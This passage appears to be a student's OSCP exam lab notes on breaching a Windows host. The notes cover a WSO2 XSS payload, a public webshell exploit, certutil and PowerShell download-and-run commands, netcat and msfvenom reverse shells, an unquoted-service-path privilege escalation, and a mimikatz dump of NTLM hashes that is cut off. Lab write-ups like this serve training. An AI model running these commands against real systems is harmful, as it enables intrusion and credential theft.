
Initial notes:
```
[x]80: 
	- browse to webpage [X]
		- Defaault web page
	- gobust
		- Nothing
	- dirsearch
		- Nothing
	- nikto
		- nothing
	- ffuf 
		- nothing
135: Probably not a vector
139: Probably not a vector
[x] 445:
	- crackmapexec anonymous and guest login [X]
		- Got OS version, anon and guest login disabled.
	- smbclient
[x] **5040: RPC listener for the Windows Deployment Services server
[X] **5672: Scanning with custom script for AMQP
**7680: pando-pub
**8099:
**8243:
**8280:
**8672:
8672: tried connecting to with telnet
9099:
9443:
9611:
9711:
9763:
[x] 9999: Java- RMI
- What is Java RMI used for?
The Java Remote Method Invocation (RMI) system allows an object running in one Java virtual machine to invoke methods on an object running in another Java virtual machine. RMI provides for remote communication between programs written in the Java programming language.
[x] 11111: Jave -RMi
19150: gkrellm service - have never seen before
- buffer overflow? https://www.exploit-db.com/exploits/22832
49669: MSRPC
49668: MSRPC
49667: MSRPC 
49665: MSRPC
49666: MSRPC
49664: MSRPC
49671: MSRPC
49672: MSRPC
65469: MSRPC
```

PORT 80 Enum:

#webpage #browsing 
- Fresh IIS server
	- robots.txt doesn't exist

#gobuster #common.txt
```shell

┌──(root㉿kali)-[/home/kali]
└─# gobuster dir -u http://192.168.118.101:80 -w /usr/share/dirb/wordlists/common.txt -x php,txt,html,asp,aspx

```

#dirsearch #medium.txt
```shell
┌──(root㉿kali)-[/home/kali]
└─# dirsearch -u http://192.168.118.101:80 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

```
#dirsearch
```shell

dirsearch -e php,html,js,asp,aspx -u http://192.168.118.101:80 -x 400,401,403 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

````

#nikto
```
#nikto 
```shell
┌──(root㉿kali)-[/home/kali]
└─# nikto -host http://192.168.118.101
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.118.101
+ Target Hostname:    192.168.118.101
+ Target Port:        80
+ Start Time:         2023-04-12 09:16:16 (GMT-4)
---------------------------------------------------------------------------
+ Server: Microsoft-IIS/10.0
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Allowed HTTP Methods: OPTIONS, TRACE, GET, HEAD, POST 
+ Public HTTP Methods: OPTIONS, TRACE, GET, HEAD, POST 

```

Port 8280 Enum:
```shell

┌──(root㉿kali)-[/home/kali]
└─# gobuster dir -u http://192.168.118.101:8280 -w /usr/share/dirb/wordlists/common.txt -x php,txt,html,asp,aspx
==============================================================
Gobuster v3.4
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
==============================================================
[+] Url:                     http://192.168.118.101:8280
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirb/wordlists/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.4
[+] Extensions:              php,txt,html,asp,aspx
[+] Timeout:                 10s
==============================================================
2023/04/12 13:09:54 Starting gobuster in directory enumeration mode
==============================================================
/favicon.ico          (Status: 301) [Size: 0] [--> http://wso2.org/favicon.ico]
Progress: 10443 / 27690 (37.71Progress: 10514 / 27690 (37.97Progress: 10599 / 27690 (38.28Progress: 10650 / 27690 PrProgre/service              (Status: 200) [Size: 0]
Progress: 21543 / 27690 (77.80%)[ERROR] 2023/04/12 13:12:07 [!] unexpected EOF
/userinfo             (Status: 400) [Size: 70]
Progress: 27628 / 27690 (99.78%)
==============================================================
2023/04/12 13:12:46 Finished
==============================================================

```

PORT 8243 Web Server Found!
```
┌──(root㉿kali)-[/home/kali]
└─# gobuster dir -u https://192.168.118.101:8243 -w /usr/share/dirb/wordlists/common.txt -x php,txt,html,asp,aspx -k
===============================================================
Gobuster v3.4
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://192.168.118.101:8243
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirb/wordlists/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.4
[+] Extensions:              php,txt,html,asp,aspx
[+] Timeout:                 10s
===============================================================
2023/04/12 13:18:04 Starting gobuster in directory enumeration mode
===============================================================
/favicon.ico          (Status: 301) [Size: 0] [--> http://wso2.org/favicon.ico]
/service              (Status: 200) [Size: 0]
/services             (Status: 200) [Size: 514]
/userinfo             (Status: 400) [Size: 70]
Progress: 27668 / 27690 (99.92%)
===============================================================
2023/04/12 13:21:28 Finished
===============================================================

https://accounts.wso2.com/authenticationendpoint/login.do?RelayState=https%3A%2F%2Fwso2.com%2Fsaml_login%2F&commonAuthCallerPath=%2Fsamlsso&forceAuth=false&passiveAuth=false&tenantDomain=carbon.super&sessionDataKey=dc620108-3771-4196-a1a6-281171663d4c&relyingParty=https%3A%2F%2Fwso2.com&type=samlsso&sp=wso2.com-sso&isSaaSApp=false&authenticators=BasicAuthenticator%3ALOCAL&reCaptcha=true
```

PORT 445 Enum:
- Guest login disabled - got a windows version and OS
#crackmapexec #guest
```shell
┌──(root㉿kali)-[/home/kali]
└─# crackmapexec smb 192.168.118.101 -u 'guest' -p '' --sessions
SMB         192.168.118.101 445    MS01             [*] Windows 10.0 Build 19041 x64 (name:MS01) (domain:oscp.exam) (signing:False) (SMBv1:False)
SMB         192.168.118.101 445    MS01             [-] oscp.exam\guest: STATUS_ACCOUNT_DISABLED 
```

#crackmapexec #anonymouslogin
```shell
┌──(root㉿kali)-[/home/kali]
└─# crackmapexec smb 192.168.118.101 -u '' -p '' --sessions 
SMB         192.168.118.101 445    MS01             [*] Windows 10.0 Build 19041 x64 (name:MS01) (domain:oscp.exam) (signing:False) (SMBv1:False)
SMB         192.168.118.101 445    MS01             [-] oscp.exam\: STATUS_ACCESS_DENIED 
```

- denied, can't connect
#smbclient #anonymous 
```shell
  
#smbclient anonymous 
smbclient -L \\\\192.168.118.101 -N 

```


Port 9443 Enum:
![[random publisher directory.png]]
Port 5672 Enum:

- didnt get anything - dead end
```shell
# pulled nmap scan from hacktricks
PORT     STATE SERVICE VERSION
5672/tcp open  amqp?
|_amqp-info: ERROR: AMQP:handshake connection closed unexpectedly while reading frame header
```

Port 9999 & 111111 ENumeration:
#java #rmi
```shell
# downloaded java remote method guesser and ran against the two Java RMi Ports
# disclosing as not an RMi service, my nmap scan says otherwise
┌──(root㉿kali)-[/home/kali/Downloads]
└─# ./rmg-4.4.0-jar-with-dependencies.jar enum 192.168.118.101 9999
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
[-] Caught SocketTimeoutException during list call.
[-] The specified port is probably not an RMI service.
[-] Cannot continue from here.
                                                                                                                                                                                                                                             
┌──(root㉿kali)-[/home/kali/Downloads]
└─# ./rmg-4.4.0-jar-with-dependencies.jar enum 192.168.118.101 11111
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
[-] Caught SocketTimeoutException during list call.
[-] The specified port is probably not an RMI service.
[-] Cannot continue from here.
```

Port 19150 gkrellm enumeration
#gkrellm 
```
@ no serviuce information
┌──(root㉿kali)-[/home/kali]
└─# nmap -p 19150 192.168.118.101 --script gkrellm-info
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-12 11:13 EDT
Nmap scan report for 192.168.118.101
Host is up (0.047s latency).

PORT      STATE SERVICE
19150/tcp open  gkrellm

Nmap done: 1 IP address (1 host up) scanned in 8.01 seconds
```

- 2 buffer overflow exploits, unsure of what gkrellm version mine is but going to throw anyways
#searchsploit
```

┌──(root㉿kali)-[/home/kali/Downloads]
└─# searchsploit gkrellm
---------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                    |  Path
---------------------------------------------------------------------------------- ---------------------------------
GKrellM GKrellWeather 0.2.7 Plugin - Local Stack Buffer Overflow                  | linux/local/31151.c
GKrellM Mailwatch Plugin 2.4.1/2.4.2 - From Header Remote Buffer Overflow         | linux/remote/22873.c
Gkrellmd 2.1 - Remote Buffer Overflow (1)                                         | freebsd/dos/22831.pl
Gkrellmd 2.1 - Remote Buffer Overflow (2)                                         | freebsd/remote/22832.pl
---------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

# attempting to throw and keep getting error, not sure of perl scripts

┌──(root㉿kali)-[/home/kali/Documents/12apr_exam/ADset]
└─# ./22831.pl 192.168.118.101 19150
./22831.pl: 1: source:: not found
./22831.pl: 3: GKrellMd: not found
./22831.pl: 5: The: not found
./22831.pl: 7: A: not found
./22831.pl: 9: This: not found
./22831.pl: 12: use: not found
./22831.pl: 21: Syntax error: word unexpected (expecting ")")

```

Going down the successful gobuster route:
- Went down /services directory
```
┌──(root㉿kali)-[/home/kali]
└─# gobuster dir -u https://192.168.118.101:8243 -w /usr/share/dirb/wordlists/common.txt -x php,txt,html,asp,aspx -k
===============================================================
Gobuster v3.4
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://192.168.118.101:8243
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirb/wordlists/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.4
[+] Extensions:              php,txt,html,asp,aspx
[+] Timeout:                 10s
===============================================================
2023/04/12 13:18:04 Starting gobuster in directory enumeration mode
===============================================================
/favicon.ico          (Status: 301) [Size: 0] [--> http://wso2.org/favicon.ico]
/service              (Status: 200) [Size: 0]
/services             (Status: 200) [Size: 514]
/userinfo             (Status: 400) [Size: 70]
Progress: 27668 / 27690 (99.92%)
===============================================================
2023/04/12 13:21:28 Finished
===============================================================



https://accounts.wso2.com/authenticationendpoint/login.do?RelayState=https%3A%2F%2Fwso2.com%2Fsaml_login%2F&commonAuthCallerPath=%2Fsamlsso&forceAuth=false&passiveAuth=false&tenantDomain=carbon.super&sessionDataKey=dc620108-3771-4196-a1a6-281171663d4c&relyingParty=https%3A%2F%2Fwso2.com&type=samlsso&sp=wso2.com-sso&isSaaSApp=false&authenticators=BasicAuthenticator%3ALOCAL&reCaptcha=true
```

- Found /services which leads to a page that can pull multiple different information

![[services 1.png]]

- At the end of the echo directory page it has directories that are navigatable to

- https://192.168.118.101:8243/services/echo.echoHttpsSoap11Endpoint
	- unreachable
- http://192.168.118.101:8280/services/echo.echoHttpSoap12Endpoint
	- unreachable

- Both are unreachable
![[Penetration Testing v2/oscp pass 20230412/AD Set/MS01 192.168.118.101/screenshots/services echo.png]]


- Checking WorkflowCallbackService directory
- https://192.168.118.101:8243/services/WorkflowCallbackService.WorkflowCallbackServiceHttpsSoap11Endpoint
- http://192.168.118.101:8280/services/WorkflowCallbackService.WorkflowCallbackServiceHttpSoap11Endpoint


![[Penetration Testing v2/oscp pass 20230412/AD Set/MS01 192.168.118.101/screenshots/workflowcallbackservice.png]]

- With dirsearch found a login page @ the /authorize directory
```
# https://192.168.118.101:9443/carbon/admin/login.jsp
┌──(root㉿kali)-[/home/kali/Documents/12apr_exam/192.168.118.124]
└─# dirsearch -e php,html,js,asp,aspx -u http://192.168.118.101:8280 -x 400,401,403 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

![[Penetration Testing v2/oscp pass 20230412/AD Set/MS01 192.168.118.101/screenshots/dirsearch results.png]]

![[Penetration Testing v2/oscp pass 20230412/AD Set/MS01 192.168.118.101/screenshots/ws02 carbon login page.png]]

- once i hit this login page looked up exploits and found https://github.com/cxosmo/CVE-2022-29548
- I didnt modify anything on it, threw it into the url and it worked with the IP address given
-   Payload snippet: `https://192.168.118.101:9443/carbon/admin/login.jsp?loginStatus=false&errorCode=%27);alert(document.domain)//`

![[Penetration Testing v2/oscp pass 20230412/AD Set/MS01 192.168.118.101/screenshots/CVE 2022 29548.png]]

![[Penetration Testing v2/oscp pass 20230412/AD Set/MS01 192.168.118.101/screenshots/Utilizing The Exploit.png]]

- on as admin@carbon.super
- OS System user Bob.martin

![[Penetration Testing v2/oscp pass 20230412/AD Set/MS01 192.168.118.101/screenshots/Pasted image 20230412134139.png]]

- beginning enumeration to find a place to put a reverse shell

home > extensions > add location - needs a .jar file, going to keep looking
![[rev shell location maybe.png]]

- was unable to find a way to upload shell

- Was able to get webshell via https://github.com/hakivvi/CVE-2022-29464
	- DIDNT MODIFY AT ALL
![[CVE-2022-29464 Exploit github example.png]]

#webshell
```
┌──(root㉿kali)-[/home/kali/Documents/12apr_exam/ADset]
└─# python3 exploit.py https://192.168.118.101:9443/ pwned.jsp
shell @ https://192.168.118.101:9443//authenticationendpoint/pwned.jsp

```


![[webshell.png]]


![[Penetration Testing v2/oscp pass 20230412/AD Set/MS01 192.168.118.101/screenshots/system info.png]]

- going to try to pull over nc.exe to get a reverse shell

certutil.exe -urlcache -split -f "http://192.168.49.118:1337/nc.exe"


- successfully transferred but unable to use dir

![[nc.exe transfer.png]]

- going to try to catch nc rev shell

```shell

#- nc.exe reverse shell - on victim box 
nc.exe 192.168.49.118 1111 -e cmd.exe

# on attacker box
┌──(root㉿kali)-[/home/kali]
└─# nc -lvnp 1111

```

![[working netcat reverse shell.png]]

GOT LOCAL.TXT on first ad set machine: - check
```shell

C:\Users\BOB~1.MAR\Desktop>ipconfig
ipconfig

Windows IP Configuration


Ethernet adapter Ethernet1:

   Connection-specific DNS Suffix  . : 
   IPv4 Address. . . . . . . . . . . : 172.16.118.101
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 

Ethernet adapter Ethernet0 2:

   Connection-specific DNS Suffix  . : 
   IPv4 Address. . . . . . . . . . . : 192.168.118.101
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.118.254

C:\Users\BOB~1.MAR\Desktop>type local.txt
type local.txt
d5ba25dbe8e2a678a403d7fdea806dfb

C:\Users\BOB~1.MAR\Desktop>

```


![[bob local.txt 1st flag AD set.png]]

- going to try to priv esc

- powerup.ps1 for priv esc, identify way forward
	- if a user is found get-acl in power up to see privileges


#powerup
- Ran powerUp and discovered unquoated service path in the 
	- C:\Program Files (x86)\TRIGONE\Remote System Monitor
```shell
echo IEX(New-Object Net.WebClient).DownloadString('http://192.168.49.118:1337/PowerUp.ps1') | powershell -noprofile -


C:\Windows\Temp>echo IEX(New-Object Net.WebClient).DownloadString('http://192.168.49.118:1337/PowerUp.ps1') | powershell -noprofile -
echo IEX(New-Object Net.WebClient).DownloadString('http://192.168.49.118:1337/PowerUp.ps1') | powershell -noprofile -


ServiceName    : RemoteSystemMonitorService
Path           : C:\Program Files (x86)\TRIGONE\Remote System Monitor Server\RemoteSystemMonitorService.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=NT AUTHORITY\Authenticated Users; 
                 Permissions=AppendData/AddSubdirectory}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'RemoteSystemMonitorService' -Path <HijackPath>
CanRestart     : False
Name           : RemoteSystemMonitorService
Check          : Unquoted Service Paths

ServiceName    : RemoteSystemMonitorService
Path           : C:\Program Files (x86)\TRIGONE\Remote System Monitor Server\RemoteSystemMonitorService.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=NT AUTHORITY\Authenticated Users; Permissions=System.Object[]}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'RemoteSystemMonitorService' -Path <HijackPath>
CanRestart     : False
Name           : RemoteSystemMonitorService
Check          : Unquoted Service Paths

ServiceName    : RemoteSystemMonitorService
Path           : C:\Program Files (x86)\TRIGONE\Remote System Monitor Server\RemoteSystemMonitorService.exe
ModifiablePath : @{ModifiablePath=C:\Program Files (x86)\TRIGONE; IdentityReference=Everyone; 
                 Permissions=System.Object[]}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'RemoteSystemMonitorService' -Path <HijackPath>
CanRestart     : False
Name           : RemoteSystemMonitorService
Check          : Unquoted Service Paths

ServiceName    : RemoteSystemMonitorService
Path           : C:\Program Files (x86)\TRIGONE\Remote System Monitor Server\RemoteSystemMonitorService.exe
ModifiablePath : @{ModifiablePath=C:\Program Files (x86)\TRIGONE; IdentityReference=Everyone; 
                 Permissions=System.Object[]}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'RemoteSystemMonitorService' -Path <HijackPath>
CanRestart     : False
Name           : RemoteSystemMonitorService
Check          : Unquoted Service Paths

ServiceName    : RemoteSystemMonitorService
Path           : C:\Program Files (x86)\TRIGONE\Remote System Monitor Server\RemoteSystemMonitorService.exe
ModifiablePath : @{ModifiablePath=C:\Program Files (x86)\TRIGONE; IdentityReference=Everyone; 
                 Permissions=System.Object[]}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'RemoteSystemMonitorService' -Path <HijackPath>
CanRestart     : False
Name           : RemoteSystemMonitorService
Check          : Unquoted Service Paths

ServiceName                     : edgeupdate
Path                            : "C:\Program Files (x86)\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe" /svc
ModifiableFile                  : C:\
ModifiableFilePermissions       : AppendData/AddSubdirectory
ModifiableFileIdentityReference : NT AUTHORITY\Authenticated Users
StartName                       : LocalSystem
AbuseFunction                   : Install-ServiceBinary -Name 'edgeupdate'
CanRestart                      : False
Name                            : edgeupdate
Check                           : Modifiable Service Files

ServiceName                     : edgeupdate
Path                            : "C:\Program Files (x86)\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe" /svc
ModifiableFile                  : C:\
ModifiableFilePermissions       : {Delete, GenericWrite, GenericExecute, GenericRead}
ModifiableFileIdentityReference : NT AUTHORITY\Authenticated Users
StartName                       : LocalSystem
AbuseFunction                   : Install-ServiceBinary -Name 'edgeupdate'
CanRestart                      : False
Name                            : edgeupdate
Check                           : Modifiable Service Files

ServiceName                     : edgeupdatem
Path                            : "C:\Program Files (x86)\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe" /medsvc
ModifiableFile                  : C:\
ModifiableFilePermissions       : AppendData/AddSubdirectory
ModifiableFileIdentityReference : NT AUTHORITY\Authenticated Users
StartName                       : LocalSystem
AbuseFunction                   : Install-ServiceBinary -Name 'edgeupdatem'
CanRestart                      : False
Name                            : edgeupdatem
Check                           : Modifiable Service Files

ServiceName                     : edgeupdatem
Path                            : "C:\Program Files (x86)\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe" /medsvc
ModifiableFile                  : C:\
ModifiableFilePermissions       : {Delete, GenericWrite, GenericExecute, GenericRead}
ModifiableFileIdentityReference : NT AUTHORITY\Authenticated Users
StartName                       : LocalSystem
AbuseFunction                   : Install-ServiceBinary -Name 'edgeupdatem'
CanRestart                      : False
Name                            : edgeupdatem
Check                           : Modifiable Service Files

ModifiablePath    : C:\Users\Bob.Martin\AppData\Local\Microsoft\WindowsApps
IdentityReference : OSCP\Bob.Martin
Permissions       : {WriteOwner, Delete, WriteAttributes, Synchronize...}
%PATH%            : C:\Users\Bob.Martin\AppData\Local\Microsoft\WindowsApps
Name              : C:\Users\Bob.Martin\AppData\Local\Microsoft\WindowsApps
Check             : %PATH% .dll Hijacks
AbuseFunction     : Write-HijackDll -DllPath 'C:\Users\Bob.Martin\AppData\Local\Microsoft\WindowsApps\wlbsctrl.dll'
```

- UNABLE TO RESTART THE SERVICE!, MAYBE CAN ABUSE BUT NEED TO RESTART SYSTEM
![[unquoted service path powershell.png]]

Going to try to abuse the unquoted service path and make a reverse shell named reverse.exe
```shell
# reverse shell
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.49.118 LPORT=7777 -f exe -o Remote.exe

# grabbed file
certutil.exe -urlcache -split -f "http://192.168.49.118:1337/Remote.exe"

```

- opened a Powershell prompt to check accesses 

Get-Acl -Path "C:\Program Files (x86)\TRIGONE\Remote System Monitor Server\RemoteSystemMonitorService.exe"

- ONLY ALLOWS SYSTEM TO OWN

![[full path owned by system.png]]


Get-Acl -Path "C:\Program Files (x86)\TRIGONE"


![[Trigone full control.png]]

- going to restart system so when service reboots it activates my shell
- restarted system and lost original shell
![[system restart.png]]


- listener setup
```shell
┌──(root㉿kali)-[/home/kali]
└─# nc -lvnp 7777                       
listening on [any] 7777 ...
connect to [192.168.49.118] from (UNKNOWN) [192.168.118.101] 59582
Microsoft Windows [Version 10.0.19044.1706]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

```

- CAUGHT REVERSE SHELL, I AM SYSTEM!

![[On as system AD box 1.png]]

First Proof.txt - check - screenshot yes
```

C:\Users\Administrator\Desktop>ipconfig
ipconfig

Windows IP Configuration


Ethernet adapter Ethernet1:

   Connection-specific DNS Suffix  . : 
   IPv4 Address. . . . . . . . . . . : 172.16.118.101
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 

Ethernet adapter Ethernet0 2:

   Connection-specific DNS Suffix  . : 
   IPv4 Address. . . . . . . . . . . : 192.168.118.101
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.118.254

C:\Users\Administrator\Desktop>type proof.txt
type proof.txt
24777ab0b143f1ed790da9b872ad6183
```

![[AD Proof.txt and Ipconfig.png]]


- users that were on the box
```shell
 Directory of C:\Users

09/14/2022  05:48 PM    <DIR>          .
09/14/2022  05:48 PM    <DIR>          ..
05/31/2022  08:03 AM    <DIR>          Administrator
05/30/2022  01:04 AM    <DIR>          Alice.Walters
05/30/2022  01:05 AM    <DIR>          Bob.Martin
09/14/2022  05:48 PM    <DIR>          DefaultAppPool
05/26/2022  09:00 PM    <DIR>          Public
               0 File(s)              0 bytes
               7 Dir(s)  17,566,973,952 bytes free

```

- going to use mimikatz

- Still have my python3 http server up to transfer files
```

┌──(root㉿kali)-[/home/kali/Documents/12apr_exam/ADset]
└─# python3 -m http.server 1337                               
Serving HTTP on 0.0.0.0 port 1337 (http://0.0.0.0:1337/) ...



# transferring over mimikatz.exe
certutil.exe -urlcache -split -f "http://192.168.49.118:1337/mimikatz.exe"
```


![[Penetration Testing v2/oscp pass 20230412/AD Set/MS01 192.168.118.101/screenshots/successful mimikatz transfer on box 1 of ad.png]]

- running mimikatz

```shell

mimikatz # sekurlsa::logonpasswords

Authentication Id : 0 ; 358387 (00000000:000577f3)
Session           : Batch from 0
User Name         : Alice.Walters
Domain            : OSCP
Logon Server      : DC01
Logon Time        : 4/12/2023 1:20:12 PM
SID               : S-1-5-21-3248544096-1843048206-1379434323-1117
	msv :	
	 [00000003] Primary
	 * Username : Alice.Walters
	 * Domain   : OSCP
	 * NTLM     : 3e24dcead23468ce597d6883c576f657
	 * SHA1     : 00d092cc9ec1e1df25681c27f23578ea953c2b4f
	 * DPAPI    : 0dd3f40f17a44d5ff351f7cd8ee69af5
	tspkg :	
	wdigest :	
	 * Username : Alice.Walters
	 * Domain   : OSCP
	 * Password : (null)
	kerberos :	
	 * Username : Alice.Walters
	 * Domain   : OSCP.EXAM
	 * Password : (null)
	ssp :	
	credman :	
	cloudap :	

Authentication Id : 0 ; 280449 (00000000:00044781)
Session           : Interactive from 1
User Name         : Bob.Martin
Domain            : OSCP
Logon Server      : DC01
Logon Time        : 4/12/2023 1:20:11 PM
SID               : S-1-5-21-3248544096-1843048206-1379434323-1118
	msv :	
	 [00000003] Primary
	 * Username : Bob.Martin
	 * Domain   : OSCP
	 * NTLM     : 2a12e2af96237b2e7277f1b321ceb7b7
	 * SHA1     : fa25c53ee57d14ae3366c6300ff2b0dc2949cbe4
	 * DPAPI    : 321d3d569722c849083c94967b1045b3
	tspkg :	
	wdigest :	
	 * Username : Bob.Martin
	 * Domain   : OSCP
	 * Password : (null)
	kerberos :	
	 * Username : Bob.Martin
	 * Domain   : OSCP.EXAM
	 * Password : (null)
	ssp :	
	credman :	
	cloudap :	

Authentication Id : 0 ; 995 (00000000:000003e3)
Session           : Service from 0
User Name         : IUSR
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 9/14/2022 9:17:30 PM
SID               : S-1-5-17
	msv :	
	tspkg :	
	wdigest :	
	 * Username : (null)
	 * Domain   : (null)
	 * Password : (null)
	kerberos :	
	ssp :	
	credman :	
	cloudap :	

Authentication Id : 0 ; 997 (00000000:000003e5)
Session           : Service from 0
User Name         : LOCAL SERVICE
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 9/14/2022 9:17:28 PM
SID               : S-1-5-19
	msv :	
	tspkg :	
	wdigest :	
	 * Username : (null)
	 * Domain   : (null)
	 * Password : (null)
	kerberos :	
	 * Username : (null)
	 * Domain   : (null)
	 * Password : (null)
	ssp :	
	credman :	
	cloudap :	

Authentication Id : 0 ; 64091 (00000000:0000fa5b)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 9/14/2022 9:17:28 PM
SID               : S-1-5-90-0-1
	msv :	
	 [00000003] Primary
	 * Username : MS01$
	 * Domain   : OSCP
	 * NTLM     : 064caaea68c525b27e3f84ff3983f0bd
	 * SHA1     : 3b2c714a3fc32dd3ccd090eba70961bf2cbd7b25
	tspkg :	
	wdigest :	
	 * Username : MS01$
	 * Domain   : OSCP
	 * Password : (null)
	kerberos :	
	 * Username : MS01$
	 * Domain   : oscp.exam
	 * Password : 67 d8 41 41 68 3d f2 82 90 0f c1 6b 60 53 80 36 f1 d5 9d 17 15 c1 ea 4c 5b de ba 8d e8 14 44 7b 97 b7 bd e4 43 19 c4 13 bc 31 01 f2 74 7f 64 b6 9e 79 d2 af 12 05 b4 d9 2e aa 8b 08 d0 7f 6d 6c 1a 4b 74 b8 e2 04 6e 4e 06 1c 34 5f e6 01 dd 9e 93 ad 53 92 9f 63 8c 81 82 80 c4 34 c6 da be f2 ea 4a 4e 88 84 a9 ee 7f 75 9b 8c 84 89 1d a3 0f 21 19 9c 1f 69 bd e0 ec fc 90 04 04 bb fc b1 03 ce 89 26 27 81 35 0d 11 b4 b7 63 c1 aa 63 41 7d 93 0c be 10 a8 c9 73 cb 1a 14 57 37 fb 14 14 d6 58 33 29 11 5a e9 7b 72 1c cd 7f b8 a4 47 c8 75 ca 44 da 7c fb e3 12 63 b1 2c 36 17 37 a4 e1 07 32 a2 f5 be 95 7d 97 0e c8 8e 45 a7 ac fa 72 4b f4 c6 48 e8 13 60 0e 7a 51 83 fb dd 60 d1 dc d7 ef 77 54 dd 38 8a 2c 28 46 64 37 40 ce 4d ba 02 
	ssp :	
	credman :	
	cloudap :	

Authentication Id : 0 ; 64072 (00000000:0000fa48)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 9/14/2022 9:17:28 PM
SID               : S-1-5-90-0-1
	msv :	
	 [00000003] Primary
	 * Username : MS01$
	 * Domain   : OSCP
	 * NTLM     : b4acfa1e5db9a85466f9d28fd0a8c8f6
	 * SHA1     : 08f25b7d718bb70738a00270542cb9c28df9d2e2
	tspkg :	
	wdigest :	
	 * Username : MS01$
	 * Domain   : OSCP
	 * Password : (null)
	kerberos :	
	 * Username : MS01$
	 * Domain   : oscp.exam
	 * Password : 39 3c 9b d7 81 94 68 be 78 7f 38 49 a8 7f 9a 34 34 af c7 13 4b c1 56 2a 6a 9e 09 5a 03 fa c3 75 d9 5c 74 91 79 6f 25 1a 49 b0 74 b4 97 05 67 d5 91 ca c1 6d 1c 50 f9 02 97 13 f8 49 5e 99 1e e8 9b 86 ec e5 76 a6 60 4b 63 c1 4a 7e e4 6a ac 4a db 1b c7 c1 58 99 5f a2 10 82 c2 8b 21 07 58 87 c8 c9 47 89 88 7c 0b 1a 24 06 7f b3 e9 ff f1 51 4a de 44 e3 e9 d7 37 84 f8 43 28 6b 30 7b f3 35 99 10 ab df 8a 89 b6 db bc ac ad 44 3b ea 74 b8 3d 13 bd ac 0c 74 0f b4 52 8d cc 66 a6 96 8d 79 b7 ee 40 1d 97 c0 60 24 56 14 67 e4 27 2b 13 4a b9 8e 35 1d 07 a0 b9 e6 a9 2e 2f 4f ec c6 dc c3 f6 26 d8 2f d8 da ee e5 42 17 1e b3 35 c3 c0 45 0d c6 87 b2 ba e3 90 fa 55 69 31 c8 b8 e0 ef 1d 08 13 e0 c3 b9 11 ec 5a 20 38 8d f8 e6 6d cf a9 
	ssp :	
	credman :	
	cloudap :	

Authentication Id : 0 ; 62244 (00000000:0000f324)
Session           : Interactive from 1
User Name         : UMFD-1
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 9/14/2022 9:17:28 PM
SID               : S-1-5-96-0-1
	msv :	
	 [00000003] Primary
	 * Username : MS01$
	 * Domain   : OSCP
	 * NTLM     : b4acfa1e5db9a85466f9d28fd0a8c8f6
	 * SHA1     : 08f25b7d718bb70738a00270542cb9c28df9d2e2
	tspkg :	
	wdigest :	
	 * Username : MS01$
	 * Domain   : OSCP
	 * Password : (null)
	kerberos :	
	 * Username : MS01$
	 * Domain   : oscp.exam
